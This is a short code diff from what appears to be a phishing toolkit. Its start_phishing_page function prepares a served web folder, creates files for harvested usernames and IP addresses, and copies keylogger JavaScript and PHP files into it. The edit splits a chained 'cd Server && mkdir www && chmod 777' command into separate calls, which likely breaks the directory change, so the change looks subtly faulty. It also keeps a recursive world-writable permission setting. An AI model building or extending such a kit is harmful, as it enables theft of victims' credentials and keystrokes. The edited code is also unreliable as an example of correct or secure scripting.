@@ -228,7 +228,9 @@ ________________________________________________________________________________
 
 
 def start_phishing_page(page, custom_option):  # Phishing pages selection menu
-    run_command('cd Server && mkdir www && chmod 777 Server -R')
+    run_command('cd Server')
+    run_command('mkdir www')
+    run_command('chmod 777 Server -R')
     run_command('rm -r Server/www/ && mkdir Server/www')
     run_command('touch Server/www/usernames.txt && touch Server/www/ip.txt')
     run_command('cp WebPages/ip.php Server/www/ && cp WebPages/KeyloggerData.txt Server/www/ && cp WebPages/keylogger.js Server/www/ && cp WebPages/keylogger.php Server/www/ && rm -rf link.url')
